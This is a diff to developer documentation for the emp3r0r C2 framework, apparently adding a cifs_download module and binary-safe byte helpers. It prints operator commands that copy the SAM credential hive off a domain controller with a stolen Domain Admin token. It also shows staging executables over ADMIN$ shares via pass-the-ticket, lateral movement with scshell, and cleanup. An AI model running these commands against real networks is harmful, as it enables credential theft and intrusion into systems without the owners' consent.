@@ -296,7 +296,7 @@ When the emp3r0r C2 starts, it parses the modules via `InitModules` in `core/int
 1. **Discovery:** Scans `modules/*` directories for `config.json` files.
 2. **Validation:** Unmarshals the JSON. If there are duplicate parameter names, reserved flags (`force`, `help`), or schema errors, it throws a warning and skips the module.
 3. **Registration:** Stores the valid module into the `def.Modules` memory map.
-4. **Execution:** Each registered module becomes its **own top-level console command** (see `addModuleCommands` in `core/internal/cc/operator/mod_cmd.go`), with one `--flag` per parameter, e.g. `sa_whoami --pid 1234`, `cifs_upload --src mem:///x --dest \\DC01\ADMIN$\Temp\x.exe --token <SID>`. Flag defaults come from `config.json`; values are read per-invocation and never written back into the shared config.
+4. **Execution:** Each registered module becomes its **own top-level console command** (see `addModuleCommands` in `core/internal/cc/operator/mod_cmd.go`), with one `--flag` per parameter, e.g. `sa_whoami --pid 1234`, `cifs_download --src \\DC01\C$\Windows\system32\config\SAM --dest mem:///SAM --token <SID>`. Flag defaults come from `config.json`; values are read per-invocation and never written back into the shared config.
 
 > ⚠️ **There is no `use` / `set` / `run` module console anymore** (removed long ago). Do not document operators typing `use <module>`, `set <option> <value>`, or a bare `run`. Any doc, comment, `usage()` text or example that shows that flow is stale — rewrite it as `module_name --option value ...`.
 
@@ -382,6 +382,8 @@ All memory reading primitives safely access unmanaged memory addresses across Wi
 | `http_post`                                | `(url, content_type, body)`  | Performs HTTP POST request and returns body content string.                                |
 | `exec_cmd`                                 | `(cmd, args=[])`             | Executes shell command with optional argument string list. Returns combined output string. |
 | `crypto_hash`                              | `(algo, data)`               | Computes hash (`"md5"`, `"sha1"`, `"sha256"`) of `data`.                                   |
+| `bytes_to_b64` / `b64_to_bytes`            | `(data)` / `(b64)`           | Binary-safe base64 round-trip for `bytes`/string values (builtins in `core/lib/script/api_bytes.go`). |
+| `write_bytes`                              | `(path, data)`               | Writes `bytes`/string binary-safely to a local or `mem:///` path via the agent's file writer.      |
 
 #### F. Predeclared Global Variables
 
@@ -482,7 +484,7 @@ See these reference implementations:
 | `core/modules/SA/whoami.star`           | Full token inspection: user, groups, privileges. Thread-token-first fallback. |
 | `core/modules/injection/thread_inject.star` | Remote thread injection under the operator-selected token.          |
 | `core/modules/SA/get_dpapi_system.star` | Checking token elevation before attempting LSA secret extraction.             |
-| `core/modules/cifs_upload/cifs_upload.star` | SMB/CIFS file upload to agent-less hosts under a stolen token or an imported Kerberos ticket. |
+| `core/modules/cifs/cifs.star` | SMB/CIFS file upload/download/deletion to and from agent-less hosts under a stolen token or an imported Kerberos ticket. |
 
 ### 6.5 COFF (BOF) Modules and Tokens
 
@@ -555,9 +557,9 @@ Notes:
 - `list_tokens` also shows make_token sessions (annotated with `[make_token session]`), and the `--token`/`--session` completers offer both SIDs and session names.
 - The session token is an impersonation duplicate of the logon token; it remains valid until the agent exits or the session is recreated under the same name.
 
-### 6.9 CIFS/SMB Uploads to Agent-less Hosts
+### 6.9 CIFS/SMB Uploads/Downloads to Agent-less Hosts
 
-On a domain-joined host with a Domain Admin logged in (or a DA token/ticket available in the agent session) you can push files to machines that run **no agent at all** — straight over their `ADMIN$`/`C$`/… shares — as long as the DA identity has access. This is the `cifs_upload` starlark module:
+On a domain-joined host with a Domain Admin logged in (or a DA token/ticket available in the agent session) you can push files to machines that run **no agent at all** — straight over their `ADMIN$`/`C$`/… shares — as long as the DA identity has access. This is the `cifs_upload` starlark module (same script also provides `cifs_download` for pulling files back and `cifs_rm` for cleanup):
 
 ```
 cifs_upload --src mem:///stage.exe --dest \\DC01\ADMIN$\Temp\stage.exe \
@@ -569,7 +571,9 @@ cifs_upload --user CORP.LOCAL/da --ticket <base64 KRB-CRED .kirbi> \
 
 `--src` may be a `mem:///` file staged on the agent (CC `put`/`file_downloader`), an agent-local path, or an `http(s)://` URL. How it works: the script is pure Win32 file I/O — `CreateFileW("\\target\\ADMIN$\\...")` + chunked `WriteFile` over the UNC path. Every `win_call` impersonates the module's token, so the SMB redirector opens a session for the stolen identity; with a `make_token` session the network identity is the imported Kerberos ticket (pass-the-ticket over SMB). No agent, no `net use`, no credentials on the target — the ticket/token already present in the agent session is all that is needed for CIFS access. Pair with `scshell` to execute the uploaded file on the target (service-control lateral movement under the same token context).
 
-The `cifs_rm` module is the cleanup half of the pair: it removes a remote file or an empty directory (`cifs_rm --dest \\DC01\ADMIN$\Temp\stage.exe` / `--rmdir true`) over the share under the same token/ticket context (`DeleteFileW`/`RemoveDirectoryW`, verified by re-opening the path).
+The `cifs_download` module is the pull half: it streams a remote file back over the share (`CreateFileW(GENERIC_READ)` + chunked `ReadFile`, bytes pulled out with `win_read_mem` and saved through the binary-safe `write_bytes` helper) into `mem:///` (retrieve with CC `get`) or a local path — e.g. `cifs_download --src \\DC01\C$\Windows\system32\config\SAM --dest mem:///SAM --token <DA token>`. `--verify true` re-reads the file and compares hashes to detect mid-transfer changes. Downloads run under the same token/ticket context as uploads.
+
+The `cifs_rm` module is the cleanup half of the trio: it removes a remote file or an empty directory (`cifs_rm --dest \\DC01\ADMIN$\Temp\stage.exe` / `--rmdir true`) over the share under the same token/ticket context (`DeleteFileW`/`RemoveDirectoryW`, verified by re-opening the path).
 
 ---
 
